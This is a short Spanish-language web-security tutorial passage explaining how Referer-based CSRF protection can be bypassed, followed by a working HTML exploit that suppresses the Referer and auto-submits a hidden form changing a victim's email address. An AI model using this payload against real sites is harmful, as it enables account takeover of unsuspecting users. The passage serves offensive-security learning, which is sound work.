
El referer es el header que le indica al servidor desde que pagina provenimos, este header puede ser usado para evitar ataques CSRF, pero si esta protección no está bien implementada podemos bypasearla, muchas veces directamente si no está siendo presentado el referer no se valida, para evitar que la victima envié su referer usaremos el siguiente exploit:

```html
<meta name="referrer" content="no-referrer"/>

<form method="POST" action="https://URL/">
	<input type="hidden" name="email" value="newmail@pwned.com"/>
</form>

<script>
	document.forms[0].submit();
</script>
```